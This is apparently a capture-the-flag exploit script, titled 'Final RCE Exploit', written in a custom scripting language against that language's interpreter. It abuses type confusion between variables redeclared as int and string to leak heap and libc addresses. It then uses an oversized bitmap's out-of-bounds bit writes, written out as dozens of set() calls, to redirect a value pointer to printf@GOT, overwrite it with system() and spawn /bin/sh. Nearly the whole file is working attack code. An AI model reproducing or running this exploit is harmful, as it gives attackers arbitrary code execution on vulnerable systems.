print("=== Final RCE Exploit ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;
print("addr1:");
print(addr1);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 3: Create target variable");
int target = 0;
string target = "target";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 4: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 5: Calculate addresses");
int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
int bitmapptr = addr1 - 4096;
int offset = valueptraddr - bitmapptr;
int bitindex = offset * 8;
print("Calculated bit_index:");
print(bitindex);
print("Using this bit_index for write operations");

print("Step 6: Write printf@GOT to value_ptr");
print("printf@GOT = 0x409048");
print("Writing 64 bits starting at calculated bit_index...");
set(b1, 33984, 0, 0);
set(b1, 33985, 0, 0);
set(b1, 33986, 0, 0);
set(b1, 33987, 0, 1);
set(b1, 33988, 0, 0);
set(b1, 33989, 0, 0);
set(b1, 33990, 0, 1);
set(b1, 33991, 0, 0);
set(b1, 33992, 0, 0);
set(b1, 33993, 0, 0);
set(b1, 33994, 0, 0);
set(b1, 33995, 0, 0);
set(b1, 33996, 0, 1);
set(b1, 33997, 0, 0);
set(b1, 33998, 0, 0);
set(b1, 33999, 0, 1);
set(b1, 34000, 0, 0);
set(b1, 34001, 0, 0);
set(b1, 34002, 0, 0);
set(b1, 34003, 0, 0);
set(b1, 34004, 0, 0);
set(b1, 34005, 0, 0);
set(b1, 34006, 0, 1);
set(b1, 34007, 0, 0);
set(b1, 34008, 0, 0);
set(b1, 34009, 0, 0);
set(b1, 34010, 0, 0);
set(b1, 34011, 0, 0);
set(b1, 34012, 0, 0);
set(b1, 34013, 0, 0);
set(b1, 34014, 0, 0);
set(b1, 34015, 0, 0);
set(b1, 34016, 0, 0);
set(b1, 34017, 0, 0);
set(b1, 34018, 0, 0);
set(b1, 34019, 0, 0);
set(b1, 34020, 0, 0);
set(b1, 34021, 0, 0);
set(b1, 34022, 0, 0);
set(b1, 34023, 0, 0);
set(b1, 34024, 0, 0);
set(b1, 34025, 0, 0);
set(b1, 34026, 0, 0);
set(b1, 34027, 0, 0);
set(b1, 34028, 0, 0);
set(b1, 34029, 0, 0);
set(b1, 34030, 0, 0);
set(b1, 34031, 0, 0);
set(b1, 34032, 0, 0);
set(b1, 34033, 0, 0);
set(b1, 34034, 0, 0);
set(b1, 34035, 0, 0);
set(b1, 34036, 0, 0);
set(b1, 34037, 0, 0);
set(b1, 34038, 0, 0);
set(b1, 34039, 0, 0);
set(b1, 34040, 0, 0);
set(b1, 34041, 0, 0);
set(b1, 34042, 0, 0);
set(b1, 34043, 0, 0);
set(b1, 34044, 0, 0);
set(b1, 34045, 0, 0);
set(b1, 34046, 0, 0);
set(b1, 34047, 0, 0);

print("Write completed");

print("Step 7: Verify corruption");
print("target.value_ptr should now point to printf@GOT");
int verify = target;
print("Reading target (should be printf address from libc):");
print(verify);

print("Step 8: Calculate system_addr");
print("system_addr = leaked - 0x88550 + 0x58750");
print("Calculating at runtime...");
int setvbufoffset = 558416;
int systemoffset = 362320;
int libcbase = leaked - setvbufoffset;
int systemaddr = libcbase + systemoffset;
print("libc_base:");
print(libcbase);
print("system_addr:");
print(systemaddr);

print("Step 9: Write system_addr to GOT");
target = systemaddr;
print("Write completed");

print("Step 10: Trigger shell");
print("print with /bin/sh");
print("This should call system and give shell");


